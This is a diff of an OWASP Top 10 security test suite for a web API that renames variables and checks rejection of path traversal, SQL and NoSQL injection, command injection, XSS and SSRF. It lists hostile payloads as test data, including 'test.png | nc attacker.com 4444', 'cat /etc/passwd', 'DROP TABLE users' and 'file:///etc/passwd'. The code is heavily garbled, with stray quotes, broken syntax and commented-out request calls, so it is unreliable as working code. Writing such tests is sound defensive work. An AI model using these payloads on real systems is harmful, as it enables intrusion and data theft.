@@ -20,7 +20,7 @@ describe('OWASP Top 10 Security Tests', () =>
     it('should prevent unauthorized access to user data', async() =>
     '
       // Try to access another user's data'
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 get('/api/v1/users/999/profile')'
 set('Authorization', authToken)
 expect(403)'
@@ -28,7 +28,7 @@ expect(403)'
   )
   '
     it('should enforce proper authorization on admin endpoints', async() =>
-    // const _response = awaitrequest(server);'
+    // const response = awaitrequest(server);'
     get('/api/v1/admin/users');
     '
 set('Authorization', authToken)
@@ -39,8 +39,8 @@ expect(403)'
     it('should prevent path traversal attacks', async() =>
   {
     '
-    const _maliciousPath = '../../../etc/passwd';
-    // const _response = awaitrequest(server);'
+    const maliciousPath = '../../../etc/passwd';
+    // const response = awaitrequest(server);'
     get(`/api/v1/files/\$encodeURIComponent(maliciousPath)`)`
 set('Authorization', authToken)
 expect(400)'
@@ -48,7 +48,7 @@ expect(400)'
     });'
     it('should validate object references', async() => {
       // Try to access resources with manipulated IDs
-      const _manipulatedIds = [
+      const manipulatedIds = [
 '
         'project_999999','
         'project_-1','
@@ -56,7 +56,7 @@ expect(400)'
         'project_undefined','
         'project_../../admin'];
   for(const _id of manipulatedIds) {
-// const _response = awaitrequest(server); '
+// const response = awaitrequest(server); '
 get(`/api/v1/projects/\
     $id`)`;
     set('Authorization', authToken);
@@ -69,7 +69,7 @@ get(`/api/v1/projects/\
   '
   describe(''
     it('should use HTTPS in production', async() =>
-    // const _response = awaitrequest(server);'
+    // const response = awaitrequest(server);'
     get('/api/v1/config/security');
     '
 set('Authorization', authToken)
@@ -80,7 +80,7 @@ expect(200)
   )
   '
     it('should properly hash sensitive data', async() =>
-    // const _response = awaitrequest(server);'
+    // const response = awaitrequest(server);'
     post('/api/v1/auth/register');
     '
 send(
@@ -93,7 +93,7 @@ send(
     )
     '
     it('should encrypt sensitive data at rest', async() =>
-      // const _response = awaitrequest(server);'
+      // const response = awaitrequest(server);'
       get('/api/v1/config/encryption');
       '
 set('Authorization', authToken)
@@ -107,14 +107,14 @@ expect(200)'
   describe(''
     it('should prevent SQL injection', async() =>
   {
-    const _sqlInjectionPayloads = [
+    const sqlInjectionPayloads = [
 ''; DROP TABLE users; --"'
         "1' OR '1'='1',"
         "admin'--"'
         "1; SELECT * FROM users WHERE 't' = 't'];
     '
     for (const _payload of sqlInjectionPayloads) 
-      // const _response = awaitrequest(server); '
+      // const response = awaitrequest(server); '
       get(`/api/v1/search?q=\$encodeURIComponent(payload)`)`
 set('Authorization', authToken)
 expect(200)
@@ -123,12 +123,12 @@ expect(200)
 // }
     });'
     it('should prevent NoSQL injection', async() => {
-      const _noSqlPayloads = [
+      const noSqlPayloads = [
 
         { $ne },'' },'
         { $where: 'this.password === this.password' }];
   for(const _payload of noSqlPayloads) {
-// const _response = awaitrequest(server); '
+// const response = awaitrequest(server); '
 post('/api/v1/users/search')'
 set('Authorization', authToken)
   send(filter; //         ) {
@@ -137,13 +137,13 @@ expect(400)'
 // }
     });'
     it('should prevent command injection', async() => {
-      const _commandInjectionPayloads = [
+      const commandInjectionPayloads = [
 '
         ''
         'test.png && cat /etc/passwd','
         'test.png | nc attacker.com 4444'];
   for(const _payload of commandInjectionPayloads) {
-// const _response = awaitrequest(server); '
+// const response = awaitrequest(server); '
 post('/api/v1/images/process')'
 set('Authorization', authToken)
   send(filename; //         ) {
@@ -152,14 +152,14 @@ expect(400)'
 // }
     });'
     it('should sanitize HTML to prevent XSS', async() => {
-      const _xssPayloads = [
+      const xssPayloads = [
 '
         '<script>alert("XSS"'
         '<img src=x onerror=alert(1)>','
         'javascript:alert(1)','
         '<svg'
   for(const _payload of xssPayloads) 
-// const _response = awaitrequest(server); '
+// const response = awaitrequest(server); '
 post('/api/v1/projects')'
 set('Authorization', authToken)
 send(
@@ -172,8 +172,8 @@ expect(201)
   describe(''
     it('should enforce business logic constraints', async() => {
       // Try to create more projects than allowed
-      const _maxProjects = 10;
-      const _promises = [];
+      const maxProjects = 10;
+      const promises = [];
   for(let i = 0; i < maxProjects + 5; i++) {
         promises.push(;)
         request(server);'
@@ -182,24 +182,24 @@ set('Authorization', authToken)
 send(name)
         //         
 // }
-// const _responses = awaitPromise.all(promises);
-      const _failures = responses.filter((r) => r.status === 400);
+// const responses = awaitPromise.all(promises);
+      const failures = responses.filter((r) => r.status === 400);
       expect(failures.length).toBeGreaterThan(0);'
       expect(failures[0].body.error.code).toBe('PROJECT_LIMIT_EXCEEDED');
     });'
     it('should implement proper rate limiting', async() => {
-      const _requests = [];
+      const requests = [];
       // Send many requests quickly
   for(let i = 0; i < 150; i++) {'
         requests.push(request(server).get('/api/v1/user/profile').set('Authorization', authToken));
 // }
-// const _responses = awaitPromise.all(requests);
-      const _rateLimited = responses.filter((r) => r.status === 429);
+// const responses = awaitPromise.all(requests);
+      const rateLimited = responses.filter((r) => r.status === 429);
       expect(rateLimited.length).toBeGreaterThan(0);
     });'
     it('should validate business workflows', async() => {
       // Try to generate code without analysis
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 post('/api/v1/code/generate')'
 set('Authorization', authToken)'
 send({ analysisId: 'nonexistent_analysis','
@@ -210,14 +210,14 @@ expect(400)'
   });'
   describe(''
     it('should not expose sensitive headers', async() => {'
-// const _response = awaitrequest(server).get('/health').expect(200);
+// const response = awaitrequest(server).get('/health').expect(200);
       // Check that sensitive headers are not exposed'
       expect(response.headers['x-powered-by']).toBeUndefined();
       expect(response.headers.server).toBeUndefined();'
       expect(response.headers['x-aspnet-version']).toBeUndefined();
     });'
     it('should have proper CORS configuration', async() => {
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 options('/api/v1/images/upload')'
 set('Origin', 'https://evil.com')
 expect(204)
@@ -227,7 +227,7 @@ expect(204)
     });'
     it('should not expose debug information in production', async() => {
       // Force an error
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 get('/api/v1/crash-test')'
 set('Authorization', authToken)
 expect(500)
@@ -237,12 +237,12 @@ expect(500)
       expect(response.body.error.message).not.toContain('at Function');
     });'
     it('should have secure cookie configuration', async() => {
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 post('/api/v1/auth/login')'
 send({ email: 'test@example.com','
         password: 'password123'
 expect(200)'
-      const _cookies = response.headers['set-cookie'];
+      const cookies = response.headers['set-cookie'];
   if(cookies) {
         cookies.forEach((cookie) => {'
           expect(cookie).toContain('Secure');'
@@ -254,7 +254,7 @@ expect(200)'
   });'
   describe(''
     it('should check for vulnerable dependencies', async() => {
-// const _response = awaitrequest(server);'
+// const response = awaitrequest(server);'
 get('/api/v1/health/dependencies')'
 set('Authorization', authToken)
 expect(200)
@@ -264,9 +264,9 @@ expect(200)
   });'
   describe(''
     it('should enforce strong password requirements', async() => {'
-      const _weakPasswords = ['123456', 'password', 'qwerty', 'abc123', 'password123'];
+      const weakPasswords = ['123456', 'password', 'qwerty', 'abc123', 'password123'];
   for(const _password of weakPasswords) {
-// const _response = awaitrequest(server); '
+// const response = awaitrequest(server); '
 post('/api/v1/auth/register')
 send('
           email: `;
@@ -281,8 +281,8 @@ expect(400)`
     it('should implement account lockout after failed attempts', async() =>
       {
         '
-        const _email = 'lockout-test@example.com';
-        const _attempts = [];
+        const email = 'lockout-test@example.com';
+        const attempts = [];
         // Make multiple failed login attempts
         for (let i = 0; i < 6; i++) {
           attempts.push(;
@@ -293,8 +293,8 @@ expect(400)`
             )
             )
             // }
-            // const _responses = awaitPromise.all(attempts);
-            const _lastResponse = responses[responses.length - 1];
+            // const responses = awaitPromise.all(attempts);
+            const lastResponse = responses[responses.length - 1];
             expect(lastResponse.status).toBe(429);
             '
     expect(lastResponse.body.error.code).toBe('ACCOUNT_LOCKED')
@@ -303,7 +303,7 @@ expect(400)`
           '
   it('should implement secure session management', async() =>
             // Login to get session
-            // const _loginResponse = awaitrequest(server);'
+            // const loginResponse = awaitrequest(server);'
             post('/api/v1/auth/login');
             '
 send(
@@ -311,9 +311,9 @@ send(
               email: 'test@example.com','
               password: 'password123';
               expect(200);
-              const _sessionToken = loginResponse.body.data.token;
+              const sessionToken = loginResponse.body.data.token;
               // Verify session h attributes
-              // const _sessionResponse = awaitrequest(server);'
+              // const sessionResponse = awaitrequest(server);'
               get('/api/v1/auth/session');
               '
 set('Authorization', `Bearer \$sessionToken`)
@@ -330,9 +330,9 @@ expect(200)`
 describe(''
   it('should verify file integrity on upload', async() =>
           {
-            // const _mockImage = awaitTestHelpers.createMockImage();'
-            const _tamperedChecksum = 'invalid-checksum';
-            // const _response = awaitrequest(server);'
+            // const mockImage = awaitTestHelpers.createMockImage();'
+            const tamperedChecksum = 'invalid-checksum';
+            // const response = awaitrequest(server);'
             post('/api/v1/images/upload');
             '
 set('Authorization', authToken)'
@@ -345,10 +345,10 @@ expect(400)'
           '
   it('should validate webhook signatures', async() =>
           {
-            const _webhookPayload = {'
+            const webhookPayload = {'
         event: 'analysis.completed',analysisId: '123'  };
             // Send webhook without signature
-            // const _response = awaitrequest(server);'
+            // const response = awaitrequest(server);'
             post('/api/v1/webhooks/receive');
             send(webhookPayload);
             expect(401);
@@ -369,7 +369,7 @@ send(
             password: 'wrong-password';
             expect(401);
             // Check that event w
-            // const _logsResponse = awaitrequest(server);'
+            // const logsResponse = awaitrequest(server);'
             get('/api/v1/admin/logs/security');
             '
 set('Authorization', authToken)
@@ -387,7 +387,7 @@ expect(200)
   it('should detect and log anomalous behavior', async() =>
           {
             // Simulate anomalous behavior(rapid requests from same IP)
-            const _requests = [];
+            const requests = [];
             for (let i = 0; i < 100; i++) {
               requests.push(;
               )
@@ -400,7 +400,7 @@ set('X-Forwarded-For', '192.168.1.100')
 // }
   // // await Promise.all(requests);
     // Check anomaly detection logs
-// const _anomalyResponse = awaitrequest(server);'
+// const anomalyResponse = awaitrequest(server);'
 get('/api/v1/admin/logs/anomalies')'
 set('Authorization', authToken)
 expect(200)
@@ -418,7 +418,7 @@ describe('A10: Server-Side Request Forgery(SSRF)', () =>
             '
   it('should prevent SSRF attacks on image URLs', async() =>
             {
-              const _ssrfPayloads = [
+              const ssrfPayloads = [
 '
         'http://localhost:8080/admin','
         'http://127.0.0.1:22','
@@ -426,7 +426,7 @@ describe('A10: Server-Side Request Forgery(SSRF)', () =>
         'file:///etc/passwd','
         'gopher://localhost:3306'];
               for (const payload of ssrfPayloads) {
-                // const _response = awaitrequest(server); '
+                // const response = awaitrequest(server); '
                 post('/api/v1/images/import');
                 '
 set('Authorization', authToken)
@@ -440,13 +440,13 @@ set('Authorization', authToken)
               '
   it('should validate webhook URLs', async() =>
               {
-                const _internalUrls = [
+                const internalUrls = [
 '
         'http://localhost/webhook','
         'http://10.0.0.1/webhook','
         'http://192.168.1.1/webhook'];
                 for (const url of internalUrls) {
-                  // const _response = awaitrequest(server); '
+                  // const response = awaitrequest(server); '
                   post('/api/v1/webhooks/configure');
                   '
 set('Authorization', authToken)
@@ -464,10 +464,10 @@ describe('Additional Security Tests', () =>
                 '
   it('should implement proper input validation', async() =>
                 {
-                  const _oversizedPayload = {'
+                  const oversizedPayload = {'
         name: 'a'.repeat(10000),'
         description: 'b'.repeat(100000) };
-                  // const _response = awaitrequest(server);'
+                  // const response = awaitrequest(server);'
                   post('/api/v1/projects');
                   '
 set('Authorization', authToken)
@@ -479,34 +479,34 @@ expect(400)'
                 '
 it('should prevent timing attacks on authentication', async() =>
                 {
-                  const _timings = [];
+                  const timings = [];
                   // Test with valid and invalid users
-                  const _users = ['
+                  const users = ['
         { email: 'valid@example.com', exists },'
         { email: 'invalid@example.com', exists } ];
                   for (const user of users) {
                     '
-                    const _start = process.hrtime.bigint(); // // await request(server).post('/api/v1/auth/login').send({/g)
+                    const start = process.hrtime.bigint(); // // await request(server).post('/api/v1/auth/login').send({/g)
                     email;
                     )
-                    const _end = process.hrtime.bigint();
+                    const end = process.hrtime.bigint();
                     {
-                      const _duration = Number(end - start) / 1e6; // Convert to ms
+                      const duration = Number(end - start) / 1e6; // Convert to ms
 
                       timings.push({ exists);
                       // }
                       // Response times should be similar to prevent user enumeration
-                      const _validTiming = timings.find((t) => t.exists).duration;
-                      const _invalidTiming = timings.find((t) => !t.exists).duration;
-                      const _difference = Math.abs(validTiming - invalidTiming);
+                      const validTiming = timings.find((t) => t.exists).duration;
+                      const invalidTiming = timings.find((t) => !t.exists).duration;
+                      const difference = Math.abs(validTiming - invalidTiming);
                       expect(difference).toBeLessThan(50); // Less than 50ms difference
                     }
                     )'
 it('should implement Content Security Policy', async() =>
                     {
                       '
-                      // const _response = awaitrequest(server).get('/').expect(200);'
-                      const _csp = response.headers['content-security-policy'];
+                      // const response = awaitrequest(server).get('/').expect(200);'
+                      const csp = response.headers['content-security-policy'];
                       expect(csp).toBeDefined();
                       '
   expect(csp).toContain("default-src '")
